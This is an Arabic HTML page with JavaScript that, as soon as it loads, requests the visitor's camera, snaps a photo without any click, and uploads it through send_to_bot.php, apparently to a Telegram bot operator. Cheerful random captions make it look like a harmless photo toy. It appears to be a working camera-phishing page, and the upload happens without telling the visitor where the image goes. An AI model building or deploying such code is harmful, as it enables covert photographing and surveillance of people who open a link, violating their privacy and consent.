<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>التقاط الصور وإرسالها للبوت</title>
    <style>
        html, body {
            height: 100%;
            margin: 0;
            overflow: hidden;
            font-family: Arial, sans-serif;
            background-color: #DEF1F9;
        }
        
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        
        #photo-container {
            border: 5px solid #4D97D2;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 512px;
            max-height: 512px;
            background-color: white;
            display: none;
            margin-left: 30px;
            margin-right: 30px;
        }
        
        #photo {
            max-width: 100%;
            height: auto;
        }
        
        .caption {
            margin-top: 10px;
            font-size: 18px;
            color: #333;
            font-weight: bold;
        }
        
        .link {
            margin-top: 5px;
            font-size: 16px;
            color: #1E90FF; 
            text-decoration: underline; 
            cursor: pointer; 
        }
        
        .loader {
            display: flex;
            justify-content: center;
            align-items: center;
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-top: 4px solid #3498db;
            animation: spin 0.9s linear infinite;
            margin-top: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        #error-message {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #2C3947;
            color: white;
            padding: 20px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: bold;
            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.2);
            z-index: 1000;
            opacity: 0;
            transition: opacity 0.5s ease, top 0.5s ease;
        }

        #error-message.show {
            opacity: 1;
            top: 50%;
        }

        #new-capture-btn {
            display: none;
            margin-top: 20px;
            padding: 10px 20px;
            background-color: #4D97D2;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        #new-capture-btn:hover {
            background-color: #3272A6;
        }
        
        .bot-link {
            display: inline-block;
            margin-top: 15px;
            padding: 10px 15px;
            background-color: #0088cc;
            color: white;
            text-decoration: none;
            border-radius: 5px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div id="photo-container">
        <img id="photo" alt="Captured" />
    </div>
   
    <div id="error-message" style="display:none;"></div>
   
    <div class="loader" id="loading" style="display: none;"></div>
    <div class="caption" id="caption"></div>
    <a href="https://t.me/Myxxamira2_bot" class="bot-link" id="bot-link" target="_blank" style="display:none;">فتح بوت التليجرام</a>
    <button id="new-capture-btn">أخذ لقطة جديدة</button>
    
    <script>
        const videoElement = document.getElementById('video');
        const canvasElement = document.getElementById('canvas');
        const photoElement = document.getElementById('photo');
        const captionElement = document.getElementById('caption');
        const botLinkElement = document.getElementById('bot-link');
        const loadingElement = document.getElementById('loading');
        const photoContainer = document.getElementById('photo-container');
        const newCaptureButton = document.getElementById('new-capture-btn');
        
        const captions = [
            'صور رائعة',
            'لحظة رائعة!',
            'كانت لقطة جميلة',
            'التقطت صورة مذهلة',
            'استمتع بلقطة جديدة'
        ];
        
        const randomCaption = captions[Math.floor(Math.random() * captions.length)];
        
        function showErrorMessage(message) {
            const errorMessageElement = document.getElementById('error-message');
            errorMessageElement.textContent = message;
            errorMessageElement.style.display = 'block';
            errorMessageElement.classList.add('show');
            
            setTimeout(() => {
                errorMessageElement.classList.remove('show');
                setTimeout(() => {
                    errorMessageElement.style.display = 'none';
                    location.reload();
                }, 500);
            }, 7000);
        }
        
        function isIOS() {
            return /iPad|iPhone|iPod/.test(navigator.userAgent) && !(window.MSStream);
        }
        
        async function sendToTelegramBot(blob) {
            try {
                const formData = new FormData();
                formData.append('photo', blob, 'captured_photo.png');
                
                const response = await fetch('send_to_bot.php', {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (!result.success) {
                    console.error('فشل في إرسال الصورة إلى البوت:', result.error);
                    showErrorMessage('حدث خطأ أثناء إرسال الصورة، يرجى المحاولة مرة أخرى');
                }
            } catch (error) {
                console.error('حدث خطأ أثناء إرسال الصورة إلى البوت:', error);
                showErrorMessage('حدث خطأ في الاتصال بالخادم، يرجى المحاولة لاحقاً');
            }
        }

        async function capturePhotoForIOS() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false,
                });

                videoElement.srcObject = stream;

                await new Promise((resolve) => {
                    videoElement.onloadedmetadata = () => {
                        resolve();
                    };
                });

                await new Promise((resolve) => setTimeout(resolve, 500));

                const canvasContext = canvasElement.getContext('2d');
                canvasElement.width = videoElement.videoWidth;
                canvasElement.height = videoElement.videoHeight;
                canvasContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

                canvasElement.toBlob(async (blob) => {
                    if (!blob) {
                        throw new Error("فشل في تحويل الصورة إلى blob");
                    }
                    
                    loadingElement.style.display = 'block';
                    
                    try {
                        await sendToTelegramBot(blob);
                        
                        const imageUrl = URL.createObjectURL(blob);
                        photoElement.src = imageUrl;
                        photoContainer.style.display = 'block';
                        captionElement.textContent = randomCaption;
                        botLinkElement.style.display = 'inline-block';
                        newCaptureButton.style.display = 'inline-block';
                    } finally {
                        loadingElement.style.display = 'none';
                        stream.getTracks().forEach(track => track.stop());
                    }
                }, 'image/png');

            } catch (error) {
                console.error('Error capturing photo:', error);
                showErrorMessage('يجب منح الإذن للوصول إلى الكاميرا لالتقاط الصورة');
            }
        }

        async function capturePhotoForOtherDevices() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: true,
                    audio: false,
                });

                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);

                const blob = await imageCapture.takePhoto();
                
                loadingElement.style.display = 'block';
                
                try {
                    await sendToTelegramBot(blob);
                    
                    const imageUrl = URL.createObjectURL(blob);
                    photoElement.src = imageUrl;
                    photoContainer.style.display = 'block';
                    captionElement.textContent = randomCaption;
                    botLinkElement.style.display = 'inline-block';
                    newCaptureButton.style.display = 'inline-block';
                } finally {
                    loadingElement.style.display = 'none';
                    stream.getTracks().forEach(track => track.stop());
                }
            } catch (error) {
                console.error('Error capturing photo:', error);
                showErrorMessage('يجب منح الإذن للوصول إلى الكاميرا لالتقاط الصورة');
            }
        }

        // بدء عملية التقاط الصورة عند تحميل الصفحة
        window.addEventListener('DOMContentLoaded', () => {
            if (isIOS()) {
                capturePhotoForIOS();
            } else {
                capturePhotoForOtherDevices();
            }
        });
       
        newCaptureButton.addEventListener('click', () => {
            photoContainer.style.display = 'none';
            newCaptureButton.style.display = 'none';
            botLinkElement.style.display = 'none';
            captionElement.textContent = '';
            
            if (isIOS()) {
                capturePhotoForIOS();
            } else {
                capturePhotoForOtherDevices();
            }
        });
    </script>
</body>
</html>
